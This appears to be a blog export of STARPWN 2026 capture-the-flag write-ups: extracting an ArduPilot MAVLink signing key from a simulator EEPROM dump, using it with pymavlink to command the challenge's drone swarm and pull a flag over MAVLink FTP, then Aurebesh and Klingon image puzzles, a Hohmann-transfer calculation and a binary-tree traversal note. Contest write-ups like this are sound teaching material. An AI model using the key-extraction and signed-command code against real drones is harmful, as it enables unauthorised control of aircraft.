First, see what’s in these 16KBeeprom.bin is exactly 16,384 bytes, which is the standard size the open-source drone firmware ArduPilot uses under simulation (SITL, Software-In-The-Loop) to store data it needs to remember after power loss: flight parameters, mission waypoints, geofence settings, and of course the signing key we’re after. Checking the StorageManager.cpp definition in the ArduPilot source, this 16KB space is internally carved into several fixed-size, fixed-position regions, like a hard drive split into partitions:
The problem is, going byte by byte through 16 KB in a hex editor is tedious and error-prone. A more efficient approach is to first scan which regions actually contain data by counting the non-zero bytes in each partition. A region that’s all 0x00 is usually empty and can be skipped first; only ones with content need a closer look. I wrote a few lines of Python against the StorageManager layout to tally each region: $ python3 - <<'PY'data = open('eeprom.bin','rb').read()regions = [ ('StorageParam', 0x0000, 0x0600), ('StorageMission', 0x0600, 0x0F76), ('StorageRally', 0x0F76, 0x0FA0), ('StorageFence', 0x0FA0, 0x1000), ('unused', 0x1000, 0x1F80), ('StorageKeys', 0x1F80, 0x2000),]print(f'{"region":<15}{"range":<18}{"size":>6}{"nonzero":>9} first4')print('-'*62)for name, s, e in regions: chunk = data[s:e] nz = sum(1 for b in chunk if b) print(f'{name:<15}0x{s:04X}-0x{e:04X} {e-s:>5}{nz:>9} {chunk[:4].hex()}')PYregion range size nonzero first4--------------------------------------------------------------StorageParam 0x0000-0x0600 1536 155 50410600StorageMission 0x0600-0x0F76 2422 646 ae650000StorageRally 0x0F76-0x0FA0 42 0 00000000StorageFence 0x0FA0-0x1000 96 2 00000000unused 0x1000-0x1F80 3968 0 00000000StorageKeys 0x1F80-0x2000 128 41 d1fc5238
With this table, “how to judge what’s normal” becomes much more concrete:
StorageParam (flight parameters): plenty of non-zero data, but parsed with ArduPilot’s parameter format (name + value entries), it’s all calibration values and sensor settings, normal parameters in reasonable ranges, with no odd strings or structures smuggled in. Normal. StorageMission (mission waypoints): also has data, but parsed into waypoints it’s a very ordinary circular patrol (take off → loop → repeat), nothing hidden. StorageRally / StorageFence (rally points / geofence): almost all 0x00, with StorageFence leaving just two residual non-zero bytes, a common forensic artifact of embedded storage “not actually wiping the underlying data after deletion,” not deliberately hidden. The big unused middle: all zeros, skip it. StorageKeys: this is the one that stands out. Its first 4 bytes are d1 fc 52 38, not noise but a recognizable magic number (next section explains why), which immediately says there’s a fixed structure here.
Zooming into StorageKeys‘s 64 bytes: $ xxd -s 0x1f80 -l 64 eeprom.bin00001f80: d1fc 5238 0000 0000 d19d f1ac 3821 0000 ..R8........8!..00001f90: d4ee 003d 1876 14d9 ffa2 4d20 f58b 4485 ...=.v....M ..D.00001fa0: 51c2 cdc1 e54c f42f c00b b861 8224 9126 Q....L./...a.$.&00001fb0: 0000 0000 0000 0000 0000 0000 0000 0000 ................
The StorageKeys block at offset 0x1F80 (8064 decimal) is where the MAVLink signing key lives, and the real meat of the challenge. Decoding the key hit a classic potholeArduPilot’s GCS_Signing.cpp defines the C struct used to store the key: #define SIGNING_KEY_MAGIC 0x3852fcd1struct SigningKey { uint32_t magic; // 4 bytes: fixed marker, means this is a valid key uint64_t timestamp; // 8 bytes: anti-replay timestamp uint8_t secret_key[32];// 32 bytes: the actual key itself};
There’s an easy trap here: this struct is not PACKED. In C/C++, without explicit tight packing, the compiler inserts padding between fields for CPU efficiency, aligning each field to a multiple of its own size. Here: magic takes 4 bytes (offset 0–3), and the next field timestamp is an 8-byte type, so the compiler requires it to start at a multiple of 8. But we’re only at offset 4, so the compiler inserts 4 bytes of 0x00 padding to make timestamp actually start at offset 8. If you miss this padding and decode directly with struct.unpack_from('<IQ', data, offset) (meaning a 4-byte int + an 8-byte long with no gap), every subsequent field reads 4 bytes of garbage too far. The nastiest part of this bug is that it doesn’t error out. It quietly hands you something that looks like a key but is completely wrong. So the only reliable check is to compare the magic number after parsing: if it matches, your offset is right. The actual parsing code: import structwith open('eeprom.bin', 'rb') as f: data = f.read()OFFSET = 0x1f80 # StorageKeys partition start# '<' little-endian; 'I' 4-byte int (magic); '4x' skip 4 padding bytes (the key part!); 'Q' 8-byte long (timestamp)magic, timestamp = struct.unpack_from('<I4xQ', data, OFFSET)secret_key = data[OFFSET + 16 : OFFSET + 48]assert magic == 0x3852fcd1, "magic doesn't match: the offset or struct layout is wrong!"print(f"secret_key = {secret_key.hex()}")
The actual output: magic = 0x3852fcd1timestamp = 36527303400913secret_key = d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
The key is the first line’s magic. Compared against the definition copied from GCS_Signing.cpp: #define SIGNING_KEY_MAGIC 0x3852fcd1
The decoded magic = 0x3852fcd1 matches the hardcoded SIGNING_KEY_MAGIC byte for byte. That confirms two things at once: offset 0x1F80 is right (it really points to the start of the SigningKey struct), and the 4 padding bytes were skipped correctly (otherwise every field after magic would be misaligned and magic itself wouldn’t match). Since this “checksum” passes, the 32-byte key read afterward can be trusted: d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
Here’s the actual hex dump, with each field boxed in colour:
The red 4 bytes are the magic (little-endian, so the file order is reversed: d1 fc 52 38) Grey is the 4 bytes of padding Blue is the 8-byte timestamp; the green 32 bytes are the actual key to use
Use the key to connect to the live drone swarmWith the key in hand, the next step is to verify that “they all share the same secret” is literal: can this key dug out of an offline EEPROM authenticate directly against the still-flying drones online? Python’s most-used MAVLink library, pymavlink, has built-in message-signing support: from pymavlink import mavutilHOST, PORT = "0.cloud.chals.io", 16578 # use the live port the challenge gives# the key must be passed as raw 32 bytes, not a hex string!# (a pothole I hit once: I first wrote KEY.hex(),# and pymavlink hashed the string internally, throwing a seemingly unrelated TypeError)KEY = bytes.fromhex("d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126")m = mavutil.mavlink_connection(f"tcp:{HOST}:{PORT}", source_system=254, source_component=190)m.wait_heartbeat(timeout=15)print("connected, peer sysid =", m.target_system)m.setup_signing(KEY, sign_outgoing=True) # every message we send now is auto-signedm.mav.param_request_list_send(1, 1) # ask sysid=1 to "send me all flight parameters"
The actual run: successfully received 1,397 parameters, meaning this key is the same one the airborne swarm uses, and signature authentication fully passed. The same key tested against the other 4 drones in the swarm was valid for all of them.
At this point I had full ground-station-level access, able to read any drone’s full parameter table, mission list, and even issue flight commands.
Stuck for a long time: a pile of reasonable-looking guesses that were all dead endsAfter getting full control, I spent a lot of time guessing. Potholes I stepped in:
Comparing the 5 drones’ parameter differences for hidden messages Plotting the flight paths to see if they looked like text Checking the map webpage’s CSS filters Listening to WebSocket packets, grabbing dataflash logs…
All dead ends, clean with zero clues. I even seriously considered a Lord of the Rings angle (the challenge is called One to Rule Them All, after all), and tested “verbs” like changing flight mode, triggering Return-to-Launch, and force-disarming, all of which just produced standard ArduPilot system messages, nothing. The real breakthrough was going back to a feature I’d been using but not to its full extent: MAVLink FTP.
Ref: https://mavlink.io/en/services/ftp.html
The key turn: list the whole filesystemBesides reading sensor values and issuing flight commands, MAVLink also defines a whole file-transfer protocol (via the FILE_TRANSFER_PROTOCOL message type), letting the ground station browse, upload, and download files in the flight controller’s internal virtual filesystem, like operating a USB drive. This protocol has an OP_ListDirectory op code whose function is a genuine directory listing, equivalent to running ls in a terminal. My biggest early blind spot: because I’d read the ArduPilot docs and knew a few common filenames (like @SYS/storage.bin, crash_dump.bin), I kept looking by “guess a filename → open it directly” and never actually ran a full recursive listing of the root. That’s basically shooting in the dark, since you can’t find a file you don’t know exists. pymavlink has a fully-featured FTP client class MAVFTP, usable directly on the already-signed connection: from pymavlink.mavftp import MAVFTPftp = MAVFTP(m, target_system=1, target_component=1)all_files = []def walk(path, depth=0): ret = ftp.cmd_list([path]) if ret.error_code != 0: return for entry in list(ftp.list_result): if entry.name in ('.', '..'): continue full_path = (path.rstrip('/') + '/' + entry.name) if path != '/' else '/' + entry.name if entry.is_dir: walk(full_path, depth + 1) # recurse into directories else: all_files.append((full_path, entry.size_b))walk("/") # start from root and dig all the way down
The full filesystem that came back: /├── @ROMFS/ (firmware built-in resources, identical to open-source ArduPilot)├── @SYS/ (system diagnostic template files, all default placeholders)├── DCIM/ <-- ★ not part of the standard ArduPilot filesystem ★│ └── flag.jpg (40,536 bytes)└── terrain/ (SITL built-in terrain data blocks)
Apart from DCIM/flag.jpg, every file and folder is exactly what a fresh ArduPilot SITL install already has. The name DCIM (Digital Camera IMages) is itself perfectly plausible (it feels like photos, and it’s on my phone’s memory card too), and it echoes the camera-control commands I’d seen earlier in the mission list. So it’s hidden under a normal-looking, non-suspicious path, not a dead-giveaway name like flag.txt. Download the file, see the flagGrab it with the same MAVFTP object: for attempt in range(5): ftp.cmd_get(["/DCIM/flag.jpg", "flag.jpg"]) result = ftp.process_ftp_reply("get", timeout=30) if result.error_code == 0: break
The first attempt gave BurstReadFile failed, generic error, and the second successfully pulled down the full 40,536 bytes, confirmed a valid JPEG. Opening it:
An aerial night shot of a brightly-lit stadium in the rain, with a message projected in glowing text on the roof. Zooming in on the rooftop text:
“machines never pledged to be allegiant”
This is the real Allegiant Stadium in Las Vegas (home of the NFL’s Las Vegas Raiders). The line itself is a pun: “allegiant” is both the stadium’s name and the English word meaning “loyal, faithful.” It perfectly echoes the challenge’s core scenario: a captured machine that was never truly loyal to anyone, and the shared-key mechanism made it trivial to turn. The assembled flag: starpwn{machines_never_pledged_to_be_allegiant}
Postscript: an early clue I didn’t understand at the timeBefore finding flag.jpg, a side clue had already hinted vaguely at Allegiant Stadium, but I just couldn’t connect it to the answer at the time. Reading each swarm drone’s takeoff/landing coordinates via MAVLink and plotting them on a real satellite map, several drones’ coordinates landed precisely in the centre of the same building:
The oval building circled in red is Allegiant Stadium, its position relative to the highway interchange matching exactly. I took it for coincidence at the time and didn’t dig in; in hindsight it was the puzzle’s planted foreshadowing. The answer was set at this stadium all along, it just needed the FTP find of flag.jpg to actually read out the riddle. Takeaways MAVLink FTP’s ListDirectory is a genuine directory-listing feature, so don’t treat it as just a “grab known files” tool. A full recursive listing of root takes only seconds and leaves nothing non-standard hidden, with no guessing needed. A plausible-sounding path name gets a pass more easily than an obviously suspicious filename. When inspecting a system, don’t rely only on the “that name looks weird” instinct; do the carpet-bomb listing anyway. When parsing C binary structures, always check for the PACKED attribute first. Without it, the compiler inserts padding to align fields, and a seamless format string silently misreads every subsequent field. To check whether parsing is right, verify any known fixed constant in the structure. If it matches, the offset is right. When many reasonable-looking clues all turn up clean and empty, it’s usually a signal: go back and check whether there’s a basic protocol feature you never actually used to the fullest, rather than inventing ever more complex hypotheses from the data you already have. This challenge’s final solution was, from start to finish, just the two most basic MAVLink features, message signing and file listing, with no fancy tricks.

entry.title: The Graffiti on the Wall Is an Alien Script | Strange Holos 1 | STARPWN 2026
entry.content:
🌐 中文版：繁體中文 This challenge gives you a single image and no hints at all. The whole solve needs no complicated code, just looking at the picture carefully.
What the challenge is aboutYou get exactly one file: space1-glitter.png (1536×1024, 2.3 MB). Opening it looks like this:
The image shows a cyberpunk-style alley at night, with a wall covered in neon graffiti written in some unreadable script, plus a few projected billboards in the background. The style fits this CTF’s GLITTERCITY theme nicely, and if you look closely there’s a “GL177” neon sign further back next to a spire. There’s no text explanation anywhere, so the flag is obviously hidden somewhere in this picture.
Step 1: check the fileWith one image and no other leads, the instinctive first move is to inspect the file itself. All of these checks came back clean: file space1-glitter.png # PNG image data, 1536 x 1024, 8-bit/color RGB, non-interlacedbinwalk space1-glitter.png # only the PNG itself, no embedded archivesstrings -n 8 space1-glitter.png # only C2PA / SSL.com certificate noise
Walking the PNG chunk structure manually to confirm there’s no custom data block: import structdata = open("space1-glitter.png", "rb").read()pos = 8while pos < len(data): length = struct.unpack('>I', data[pos:pos+4])[0] ctype = data[pos+4:pos+8].decode() print(ctype, length) pos += 8 + length + 4
Output: IHDR 13caBX 29087 <- C2PA content provenance infoIDAT 2273074IEND 0
The only non-standard chunk is caBX, a C2PA (Content Provenance and Authenticity) manifest. Decoding it with exiftool shows it means exactly what it says: this is certification info for an AI-generated image, not a puzzle: Actions Software Agent Name : gpt-imageActions Digital Source Type : .../digitalsourcetype/trainedAlgorithmicMediaClaim Generator Info Name : OpenAI Media Service API
So the image was produced by an image-generation model, and caBX is just that generation process’s signature chain (SSL.com certificate, OCSP response, timestamp). Nothing is hidden inside it. Knowing this saves the time you’d otherwise waste base64-decoding a pile of certificate data on a hunch. Next, testing for LSB (least significant bit) steganography, also nothing. The LSB plane looks like pure sensor noise, and the proportion of 1s is nowhere near a suspicious 0.5: import numpy as npfrom PIL import Imagearr = np.array(Image.open("space1-glitter.png").convert("RGB"))for ch, name in zip(range(3), "RGB"): print(name, (arr[:, :, ch] & 1).mean())# R 0.4532 G 0.4466 B 0.4834
Because the image has a heavy chromatic-aberration glitch look, I also split the R/G/B channels apart, guessing one of them might hide clean text. That came up empty too. All three channels show identical glyph shapes, just offset from each other by a few pixels. The colour fringing is purely a cyberpunk art effect, not a three-layer cipher.
So the conclusion so far: the flag is in the picture itself, to be read with your eyes. That patch of strange graffiti in the middle is the puzzle.
Looking closely, you can see:
Characters 2, 6, and 9 are identical in shape (a V with a vertical bar and a serif flourish on top). Characters 3, 7, and 10 are identical in shape (a thickened 7).
So the overall structure is ? A B C | D A B ? A B: a 4-letter word and a 6-letter word sharing repeated letters at fixed positions. Step 2: the wrong turn, Standard Galactic AlphabetWhen alien-looking angular symbols show up in a CTF, the instinctive first guess is the Standard Galactic Alphabet (SGA, the symbol system from Commander Keen and Minecraft’s enchanting table). It is far and away the most commonly used substitution alphabet in CTFs. So I pulled down the official chart to compare: curl -sL -A "Mozilla/5.0" -o sga.gif https://www.omniglot.com/images/writing/sga.gif
SGA turned out to be completely wrong, and not even close. Real SGA glyphs are built from dots, short hooks, and right angles (a is a hook, f is a bar with three dots above, i is a line split into two segments, w is three dots). Not one of its 26 letters looks like a three-bar Ξ, a 7, or a V with a bar. Wrong direction. Step 3: the real answer, AurebeshThe same Omniglot index of fictional scripts also lists Aurebesh, the galactic standard script from Star Wars. Aurebesh glyphs are hard-edged and blocky, built from bars and diagonals, matching the wall text’s visual style exactly. curl -sL -A "Mozilla/5.0" -o aurebesh.gif https://www.omniglot.com/images/writing/aurekbesh.gif
Every one of the 10 characters on the wall maps to an Aurebesh letter. Here’s a side-by-side comparison, with the wall characters on top and the matching glyphs cropped from the Omniglot chart below:
# Wall character Aurebesh name Letter
1 hook + peak nern N
2 V + bar esk E
3 thickened 7 resh R
4 cross + curve forn F
5 three bars Ξ herf H
6 V + bar esk E
7 thickened 7 resh R
8 notched Ǝ dorn D
9 V + bar esk E
10 thickened 7 resh R
N E R F H E R D E R
The repeated-character structure I noticed earlier independently confirms this: characters 2/6/9 are esk (E) and characters 3/7/10 are resh (R), which matches the letter repetition in NERF / HERDER exactly. That’s the answer. “nerf herder” is more than just a plausible answerThree independent clues corroborate each other:
“Strange Holos”: holos means holograms, and the image contains a holographic billboard. Holograms are an iconic communication medium in Star Wars (Princess Leia’s distress message). The challenge name itself is a categorical hint pointing at Star Wars script. Aurebesh is the official Star Wars script, so the writing system matches the theme perfectly. “nerf herder” is one of the most famous lines in the saga. Princess Leia insults Han Solo in The Empire Strikes Back: “…you stuck-up, half-witted, scruffy-looking nerf herder!” (a nerf is a livestock animal in the Star Wars universe). That’s exactly the kind of iconic line a challenge author picks as the payoff for decoding an alien script.
FlagTranscribe the decoded text directly, keeping the space separator rather than an underscore: STARPWN{nerf herder}
I first submitted STARPWN{nerf_herder} and it was rejected. This CTF’s flag format isn’t actually consistent, so when the decoded content is a natural-language phrase, try the original space separator first instead of assuming it must become snake_case. Appendix: dead ends I walked down
Idea Result
Extra data appended after the file binwalk clean, the PNG ends at IEND
Custom PNG chunk Only caBX = C2PA provenance info (AI generation certificate)
LSB stego (per-channel and combined) Noise only, proportion of 1s sits at 0.45 to 0.48
Splitting R/G/B to find “clean text” All three channels have identical glyphs, just offset
Mirroring or rotating the graffiti 180 degrees No rotation makes the shapes into Latin letters
Using the GL177 neon sign as a “7 = T” Rosetta Stone for GLITTERCITY Dead end, since that sign uses an ordinary Latin font unrelated to the graffiti’s writing system
Standard Galactic Alphabet Ruled out after comparing against the real chart

entry.title: Klingon on the Wall, Tripped Up by Romanization | Strange Holos 2 | STARPWN 2026
entry.content:
🌐 中文版：繁體中文 This is the follow-up to Strange Holos 1, with the same setting and structure. Recognizing the script as Klingon wasn’t actually hard. What tripped me up was the last step: Klingon’s romanization and the letter it stands for as an English substitution cipher are two different things.
What the challenge is aboutAgain just one image, space2-glitter.png (1536×1024, 2.4 MB), with no other leads:
Same setup as the first one: a cyberpunk alley, a wall covered in strange neon graffiti, and background signs reading “GLITTERCITY”, “FORTUNE”, and one in Japanese saying「ホテル」(hotel).But the writing system is completely different this time: flowing, blade-like curves with hooks and sharp points.
File-level checkspngcheck space2-glitter.png chunk IHDR at offset 0x0000c, length 13 chunk caBX at offset 0x00025, length 29087 <- C2PA provenance info chunk IDAT at offset 0x071d0, length 2490933 chunk IEND at offset 0x267411, length 0No errors detected (4 chunks, 46.6% compression).
binwalk found no embedded data, pcrt reported all CRCs correct, and zsteg only turned up the bit-plane noise any ordinary photographic image has. The only non-standard chunk is again C2PA provenance info (gpt-image / OpenAI generation certificate plus SSL.com’s signature chain), the same conclusion already established in part 1: not a payload. Same conclusion: the flag is in the picture, so look at the graffiti. The characters this time are flowing curves, 8 of them:
Identifying the writing systemThese flowing, hooked, blade-like strokes, plus one character that’s a very clean “工” shape, point to Klingon (pIqaD). It fits thematically too. Part 1 was Star Wars Aurebesh, and the title “Strange Holos” is itself a nod to Star Trek: Strange New Worlds. As in part 1, I pulled the official chart to compare: curl -sL -A "Mozilla/5.0" -o klingon.gif https://www.omniglot.com/images/writing/klingon.gif
Klingon’s gh is an 工 shape, y is a bowl with an enclosed inner loop, and o is a bar plus an S-curve. All three shapes are clearly present on the wall, which confirms the writing system. Comparing by eye gives the phrase boldly go. This fits the Star Trek theme, from the most famous line in the series’ opening monologue: “to boldly go where no one has gone before.”
B O L D L Y: letters 3 and 5 are both L G O: the second letter is O, matching the second letter of BOLDLY Character 7 = G (Klingon gh, the 工 shape) Characters 2 and 8 = O (Klingon o)
With the answer settled, the full mapping is clear:
# Klingon letter English letter
1 b B
2 o O
3 l L
4 D D
5 l L
6 y Y
7 gh G
8 o O
The transliteration trapMy first submission was STARPWN{boldlh gho}, and it was rejected. The mistake was that I read the characters correctly but wrote down Klingon’s romanization rather than the English letters they represent. In Klingon romanization, gh, ch, ng, and tlh are single letters spelled with two or more characters. So that 工-shaped symbol is written gh under Klingon spelling rules, but when used as an English substitution cipher it stands for the single English letter G, making the word GO. FlagSTARPWN{boldly go}
Lowercase with a single space, consistent with the previous challenge’s STARPWN{nerf herder} format. Appendix: dead ends I walked down
Idea Result
Extra data / extra chunks binwalk clean, pngcheck clean, only caBX (C2PA)
zsteg bit planes Noise fragments only, no structure
Reading it as an actual Klingon phrase (Qapla', nuqneH, toDSaH, etc.) None fit a 6+2 split with letters 3=5 identical and characters 2=8 identical
Using Klingon romanization directly as the flag content (boldlh gho) Rejected, since multi-character romanizations must collapse to single English letters

entry.title: Right Formula, Wrong Clipboard, Four Failures in a Row | Time to Intercept | STARPWN 2026
entry.content:
🌐 中文版：繁體中文 Unlike the earlier drone-swarm posts, this is a pure orbital-mechanics calculation. You connect to an interactive shell with nc, the server prints numbers at you in real time, and you have to send two answers back within a limited number of attempts. The content itself is a solid physics problem, but what really stuck with me was reconnecting to a fresh instance later and being dumb enough to paste in the previous round’s answer, failing four times in a row.
What the challenge is about An unknown aggressor satellite has been detected in a higher orbit and is threatening critical space infrastructure. Your mission: calculate a Hohmann transfer to intercept it.
In plain terms: an enemy satellite has been detected in a higher orbit than ours and is threatening critical space infrastructure. The mission is to compute a Hohmann transfer to intercept it. After connecting to the given shell, the screen tells you three things: your own circular orbit’s radius and velocity, the target satellite’s circular orbit radius and velocity, and your current phase angle (the angular difference between the two satellites around Earth). You must return two numbers: delta_v_burn wait_time
delta_v_burn is how much velocity change (Δv, in m/s) to spend on the burn into the transfer orbit; wait_time is how many seconds to wait before burning so you and the target arrive at the rendezvous point at the same moment. Tolerances are Δv ±10 m/s and wait time ±60 seconds, with only 5 submission attempts per connection. Get it wrong or drop the connection and you reconnect to a completely fresh random problem. Background: what is a Hohmann transferA Hohmann transfer is the most basic and most fuel-efficient orbital transfer in aerospace engineering. If you’re in a low orbit and want to move to a concentric higher orbit, you don’t accelerate the whole way up; you just make two burns at the right moments. The first burn puts you on an elliptical “transfer orbit” whose one end touches your original low orbit and whose other end touches the target’s high orbit. The second burn, made when you reach that high end, straightens you out into the new circular orbit.
If you’re interested, this video explains it well: https://youtu.be/KdHI5Fn9Fu8
This challenge only scores the first burn (entering the transfer orbit), so the problem simplifies to: compute how much Δv the first burn costs, and pick the moment to burn so that you and the target meet on time at the far end of the transfer orbit. It’s a fairly standard orbital-mechanics problem with two key parts: how much velocity change the burn costs, and how long to wait before burning. Computing Δv: the standard vis-viva equationThe transfer ellipse’s semi-major axis is just the average of your orbital radius and the target’s: a_t = (r1 + r2) / 2
Use the vis-viva equation (which relates velocity to radius at any point on an elliptical orbit) to get the transfer orbit’s velocity at the starting point, your current radius r1: v_p = sqrt(mu * (2/r1 - 1/a_t))Δv1 = v_p - v1
There’s a small trick here: don’t plug in the textbook Earth value for mu (the gravitational parameter, Earth’s mass times the gravitational constant) of 398600.4418 km³/s². Instead, derive it directly from the circular orbit velocity the challenge itself prints: mu = v1**2 * r1 # self-consistent gravitational parameter, derived from our own circular orbit velocity, assuming no textbook constant
On a circular orbit, gravity supplies exactly the centripetal force, so v² / r = mu / r², and cancelling gives mu = v² * r. The Δv computed this way matches the server’s correct answer almost exactly (error on the order of 0.001 m/s), with no need to worry about whether the challenge’s Earth radius or GM constant matches the textbook definition. Computing the wait time: where I actually got stuckThe time to fly half the transfer ellipse (from the start to the rendezvous point) is: t_transfer = π * sqrt(a_t³ / mu)
Classical Hohmann rendezvous phasing theory goes like this: suppose you’re on the inner, faster orbit (angular rate n1 = v1/r1) and the target is on the outer, slower orbit (angular rate n2 = v2/r2). For the two to meet at the far end of the transfer ellipse (180 degrees away), the target must lead you by a specific angle at the moment of the burn: φ_required = π − n2 · t_transfer
(Intuitively: during the transfer you sweep a full 180 degrees, while the target only advances n2 · t_transfer, so the target has to lead by that much for you both to arrive together.) Now the problem: given the current phase angle φ0 the challenge prints, how do you derive the wait time from the difference between φ0 and φ_required? The textbook-intuition formula would be: t_wait = [(φ0 − φ_required) mod 2π] / (n1 − n2)
But this formula is wrong. My first submission of Δv=160.73, wait_time=16997.80 had the Δv accepted while the wait time was rejected (Wait time error too large). That partial rejection is actually a very precise diagnostic: it means the transfer orbit’s own physics (a_t, v_p, t_transfer) is completely fine, and the only problem is the phase angle’s direction convention. Since only the wait time was rejected, the issue has to be in how the challenge’s phase angle maps onto φ0 in the formula, not in the transfer orbital mechanics. Reversing the subtraction order, asking instead “how much further must φ0 rotate in the other direction to reach φ_required”, gives the formula that actually matches the server: t_wait = ((phi_required - phase0) % (2*math.pi)) / (n1 - n2)
Full verification: import mathr1, r2 = 6938.585e3, 7403.771e3v1, v2 = 7579.269, 7337.300phase0 = math.radians(212.256)n1, n2 = v1/r1, v2/r2mu = v1**2 * r1a_t = (r1 + r2) / 2vp = math.sqrt(mu * (2/r1 - 1/a_t))dv1 = vp - v1t_transfer = math.pi * math.sqrt(a_t**3 / mu)phi_required = math.pi - n2 * t_transfert_wait = ((phi_required - phase0) % (2*math.pi)) / (n1 - n2)print(dv1, t_wait)# 121.934 26901.33 <- the server's own answer: 121.934 m/s / 26901.426 s
Submitting 121.935 26900.962: Submitted delta-v: 121.935 m/s Required: 121.934 m/s Error: 0.001 m/sSubmitted wait time: 26900.962 s Required: 26901.426 s Error: 0.464 sINTERCEPT SUCCESS!STARPWN{h0hm4nn_tr4nsf3r_1nt3rc3pt}
That’s the complete solution for the original Time to Intercept.The challenge later reopened as a V2: same service, same scoring, just a different port. In theory the formula carries over directly, and it did. What’s interesting is what happened next.
V2: same formula, four failures from a slip of the handV2’s description, format, and tolerances are identical to V1; the only difference is a fresh set of random parameters. Connecting to the new instance printed: YOUR SATELLITE: DEFENDER-1 Orbital Radius: 6900.768 km Orbital Velocity: 7600.008 m/sTARGET SATELLITE: AGGRESSOR-X Orbital Radius: 7167.955 km Orbital Velocity: 7457.017 m/sCURRENT GEOMETRY: Phase Angle: 81.624 degrees
The trouble was that just before connecting to this fresh instance, I’d finished another connection (whose parameters were r1=6850.870 km, r2=7534.987 km, phase=199.425°, giving Δv 179.259). On the new connection, my first four submissions only adjusted the wait time while the Δv stayed at the 179.26 computed on the previous connection: attempt 1: 179.26 22068.88 -> both wrongattempt 2: 179.26 17492.12 -> both wrongattempt 3: 179.26 20347.45 -> both wrongattempt 4: 179.26 20353.73 -> both wrong
Every response was Delta-v error too large, which was the server spelling out that the Δv itself needed recomputing, not that the wait time was insufficiently precise. Each connection’s parameters are fixed (all 5 attempts on one connection share the same r1/r2/v1/v2/phase), but parameters are never shared between connections. Pasting the correctly-computed Δv from the previous connection into a new one gives a familiar-looking number that is already stale. Recomputing with the new connection’s printed parameters: r1, r2 = 6900.768e3, 7167.955e3v1, v2 = 7600.008, 7457.017phase0 = math.radians(81.624)# same formula applied# dv1 = 71.829# t_wait = 81080.728
The fifth and final attempt: > 71.829 81080.728Here is your flag: STARPWN{dont_print_th3_answer_}
So this one cost me four attempts purely from lazily reusing the previous round’s answer. FlagSTARPWN{h0hm4nn_tr4nsf3r_1nt3rc3pt} <- V1STARPWN{dont_print_th3_answer_} <- V2
Takeaways Don’t trust textbook constants for the gravitational parameter; derive it from the numbers the challenge gives you. The relation mu = v² · r always holds on a circular orbit, and the mu derived from it automatically matches the challenge’s internal Earth model, so you never have to guess which Earth radius or GM constant the author used. A “partially correct” server response is very precise debugging information. Having only the wait time rejected while the Δv quietly passed confirmed the transfer orbit’s physics (semi-major axis, vis-viva, transfer time) was already correct, narrowing the problem precisely to the phase angle’s direction convention without re-suspecting the whole algorithm. Phase-angle sign conventions are the classic trap in rendezvous problems. Textbook formulas assume a particular measurement direction and reference, so when a challenge hands you a “bare” phase angle without defining it, be ready to try the opposite direction. The two differ by exactly one synodic period, and when one is wrong the natural next step is simply to flip the direction. A “V2” of the same challenge does not mean the same numbers. Even with identical code and identical formulas, any service that randomizes per connection makes the previous connection’s correct answer stale data in the new one. The server will usually tell you honestly which field is wrong, which is far more reliable than blind guessing, and the right move is to recompute the whole set from the numbers currently on screen rather than tweaking only the number you happen to be staring at.

entry.title: Must-Know Problem-Solving Knowledge | Tree | Advanced Implementation | LeetCode Notes
entry.content:
🌐 中文版：繁體中文
In-Order Traversal by Parent FieldIn the previous post introducing Tree you may have noticed that when implementing the Binary Tree Node we declared a TreeNode *parent pointer but never used it. We can also perform Inorder Traversal via the Parent Field. To make good use of *parent for traversal, two important functions need to be mentioned:
InorderSuccessor(): in inorder order (LVR), find the next node of the traversal InorderPredecessor(): in inorder order (LVR), find the previous node of the traversal
The concept mentioned here will be related to the BST (Binary Search Tree) later
Before implementing these two functions to realize Inorder Traversal, there are a few preliminary tasks to complete:
In main(), link up the *parent pointers of the different nodes In class BinaryTree, define six member functions
// Link the parent pointers nodeB -> parent = nodeA; nodeC -> parent = nodeA; nodeD -> parent = nodeB; nodeE -> parent = nodeB; nodeG -> parent = nodeE; nodeH -> parent = nodeE; nodeF -> parent = nodeC; nodeI -> parent = nodeF;
class BinaryTree{ public: // the root is the starting node ot the tree TreeNode *root; BinaryTree(): root(0){}; BinaryTree(TreeNode *node): root(node){}; void Preorder(TreeNode *current); void Inorder(TreeNode *current); void Postorder(TreeNode *current); void Levelorder(); // add 6 new member functions TreeNode * Leftmost(TreeNode *current); TreeNode * Rightmost(TreeNode *current); TreeNode * InorderSuccessor(TreeNode *current); TreeNode * InorderPredecessor(TreeNode *current); void Inorder_by_parent(TreeNode *root); void Inorder_Reverse(TreeNode *root);};
Leftmost and SuccessorAfter the preliminary work, we define the member functions one by one, starting with Leftmost() TreeNode * BinaryTree::Leftmost(TreeNode *current){ while(current->leftchild != NULL){ current = current->leftchild; } return current;}
This is intuitive: it gets, based on currentNode, the leftmost child node (i.e. the first node to visit in that subtree). If the input is the root node, the output is the starting node of the whole Inorder Traversal. Next is Successor, which finds currentNode’s next node. There are two cases here: Case 1: if currentNode’s right child isn’t NULL, then currentNode’s next node in order is the leftmost node in the subtree rooted at “Current->rightchild”. It sounds convoluted; for example, in the figure below when nodeB is the currentNode, its right child isn’t null, so its Successor is the leftmost node in the subtree rooted at its right child, i.e. nodeG. Case 2: if currentNode has no right child, then currentNode’s next node is “an ancestor found via the left-child role”. For example, in the figure below nodeH has no right child, so its Successor must be its ancestor, but it has to be an ancestor node not yet visited. Since the order is inorder (LVR), it must be an ancestor found via the left-child role to be the next node. So nodeH finds nodeA as its Successor.
A special reminder: when implementing Case 2, a problem occurs on certain trees, e.g. a skewed tree with only a left subtree, where the whole tree has no right subtree. In that case you must return NULL, meaning the root has no successor.
TreeNode * BinaryTree::InorderSuccessor(TreeNode *current){ if(current->rightchild != NULL){ return Leftmost(current->rightchild); } TreeNode *Successor = current->parent; // if current node is succesor's right child, then keep moving back to it's parent node. while( Successor != NULL && current == Successor->rightchild){ current = Successor; Successor = Successor->parent; } // Suceessor == NULL or the current node is Successor's left child return Successor;}
With Leftmost and InorderSuccessor we can actually perform Inorder Traversal; the whole thing is combined in Inorder_by_parent void BinaryTree::Inorder_by_parent(TreeNode *root){ TreeNode *current = new TreeNode; current = Leftmost(root); while(current != NULL ){ cout << current->str << " "; current= InorderSuccessor(current); }} Now calling T.Inorder_by_parent(T.root) in main() outputs D B G E H A F I C
